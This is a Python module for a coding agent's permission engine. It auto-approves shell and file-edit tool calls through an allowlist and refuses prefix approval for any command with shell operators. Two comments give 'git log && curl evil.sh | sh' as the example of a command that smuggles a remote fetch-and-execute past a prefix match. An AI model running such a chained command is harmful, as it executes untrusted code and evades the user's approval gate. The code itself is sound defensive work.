"""Permission engine: decides which gated tool calls are auto-approved.

The agent is built with HITL interrupts on `execute`, `write_file`, and
`edit_file`. When an interrupt fires, the REPL consults this engine first;
only calls it does not auto-approve are shown to the user, who can answer
"always" to widen the session scope.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

GATED_TOOLS = ("execute", "write_file", "edit_file")
EDIT_TOOLS = ("write_file", "edit_file")

# Shell control operators that let one command smuggle another past a prefix
# match ("git log && curl evil.sh | sh" starts with the allowlisted "git log").
_SHELL_OPERATORS = re.compile(r"[;&|<>`\n]|\$\(")


def has_shell_operators(command: str) -> bool:
    return bool(_SHELL_OPERATORS.search(command))


def strip_leading_cd(command: str, project_dir: Path | None) -> str:
    """Strip a leading `cd <project_dir> && ` — exact project dir only.

    Models routinely prefix commands with a cd into the project; the remainder
    is what the allowlist should be matched against. Any other cd target is
    left alone (and will then fail auto-approval via the operator check).
    """
    if project_dir is None:
        return command
    escaped = re.escape(str(project_dir))
    match = re.match(
        rf"""^cd\s+(['"]?){escaped}/?\1\s*&&\s*(.*)$""", command.strip(), re.DOTALL
    )
    return match.group(2).strip() if match else command


def command_matches_prefix(command: str, prefix: str) -> bool:
    """True if `command` starts with `prefix` on a word boundary.

    "git status" matches "git status" and "git status -sb",
    but not "git status-foo".
    """
    command = command.strip()
    prefix = prefix.strip()
    if not prefix or not command.startswith(prefix):
        return False
    rest = command[len(prefix) :]
    return rest == "" or rest[0] in (" ", "\t")


@dataclass
class PermissionEngine:
    allow_commands: list[str] = field(default_factory=list)
    auto_approve_edits: bool = False
    project_dir: Path | None = None
    # Session-scoped grants accumulated from "always" answers.
    session_commands: list[str] = field(default_factory=list)
    session_tools: set[str] = field(default_factory=set)

    def is_auto_approved(self, tool_name: str, args: dict[str, Any]) -> bool:
        if tool_name in self.session_tools:
            return True
        if tool_name in EDIT_TOOLS:
            return self.auto_approve_edits
        if tool_name == "execute":
            command = str(args.get("command", "")).strip()
            allowed = (*self.allow_commands, *self.session_commands)
            # An exact allowlist entry approves that whole command, operators
            # included — the user spelled out precisely this command line.
            if any(command == entry.strip() for entry in allowed):
                return True
            command = strip_leading_cd(command, self.project_dir)
            # Chained/redirected commands never auto-approve on a prefix match:
            # "git log && curl evil.sh | sh" must reach the interactive gate.
            if has_shell_operators(command):
                return False
            return any(command_matches_prefix(command, entry) for entry in allowed)
        return False

    def allow_always(self, tool_name: str, args: dict[str, Any]) -> str:
        """Record an 'always allow' answer for this session. Returns a description."""
        if tool_name == "execute":
            command = str(args.get("command", "")).strip()
            # Grant the first two words as a prefix ("git push", "npm test") so
            # the grant covers variants of the same command, not everything.
            prefix = " ".join(command.split()[:2]) or command
            self.session_commands.append(prefix)
            return f"commands starting with '{prefix}'"
        self.session_tools.add(tool_name)
        return f"all '{tool_name}' calls"
